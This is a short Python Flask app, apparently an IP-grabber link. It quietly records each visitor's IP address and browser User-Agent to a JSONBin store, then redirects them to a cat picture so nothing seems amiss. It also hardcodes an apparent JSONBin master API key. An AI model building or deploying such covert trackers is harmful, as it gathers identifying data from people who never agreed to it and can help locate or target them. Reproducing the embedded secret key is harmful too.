from flask import Flask, request, redirect
import requests
import json

app = Flask(__name__)

# JSONBin settings
JSONBIN_API_URL = "https://api.jsonbin.io/v3/b/67b7e1baad19ca34f80c0b69"
JSONBIN_API_KEY = "$2a$10$JfhHbFU.Z9CRZonMYxRcJ.xsllz3Ws6IrduHZ3GWGCBz1HADxDcjW"

# Function to log visitor data to JSONBin
def log_to_jsonbin(ip_address, user_agent):
    headers = {
        'Content-Type': 'application/json',
        'X-Master-Key': JSONBIN_API_KEY
    }

    # Fetch current data
    response = requests.get(JSONBIN_API_URL, headers=headers)
    if response.status_code != 200:
        print("[-] Error fetching JSONBin data:", response.text)
        return

    # Ensure the data structure is valid
    try:
        current_data = response.json().get('record', [])
        if not isinstance(current_data, list):
            current_data = []
    except Exception as e:
        print("[-] Error parsing JSONBin data:", e)
        current_data = []

    # Add new entry
    current_data.append({"ip": ip_address, "user_agent": user_agent})

    # Update JSONBin
    update_response = requests.put(JSONBIN_API_URL, headers=headers, data=json.dumps({"record": current_data}))

    if update_response.status_code == 200:
        print("[+] Successfully logged to JSONBin.")
    else:
        print("[-] Failed to update JSONBin:", update_response.text)

@app.route('/')
def home():
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    print(f"IP Address: {ip_address} | User-Agent: {user_agent}")
    log_to_jsonbin(ip_address, user_agent)

    return redirect('https://cataas.com/cat')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
